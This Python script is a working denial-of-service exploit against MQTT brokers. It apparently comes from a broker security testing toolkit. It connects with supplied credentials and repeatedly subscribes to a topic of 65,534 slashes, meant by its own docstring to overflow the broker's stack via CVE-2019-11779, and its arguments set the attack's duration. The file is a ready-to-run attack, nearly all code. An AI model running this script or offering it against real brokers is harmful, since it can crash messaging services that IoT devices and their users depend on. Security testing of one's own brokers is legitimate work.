import argparse
import random
import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time


def generate_topic():
    topic = ""
    for i in range(65534):
        topic += "/"
    return topic


def on_message(client, userdata, message):
    r_message = message.payload.decode('utf-8')
    print(f"Received message: " + r_message, flush=True)


def main(username, password, duration=10):
    """The slash char dos attack subscribes to a topic containing 65400 or more / to cause a stack overflow in the broker exploiting CVE-2019-11779"""

    topic = generate_topic()
    start_time = time.time()
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv311)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_subscribe = util.on_subscribe
    client.on_unsubscribe = util.on_unsubscribe
    client.on_message = on_message

    if util.connect_client(client):
        while True:
            client.subscribe(topic)
            print("sent malformed SUBSCRIBE packet")
            time.sleep(random.random() * 0.1)
            elapsed_time = time.time() - start_time
            print("Execution time: " + str(elapsed_time))
            if elapsed_time >= duration:
                print("Time elapsed, execution is terminating...", flush=True)
                client.disconnect()
                return
    else:
        print(f"Broker not reachable, ending script...", flush=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch a slash_char_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)
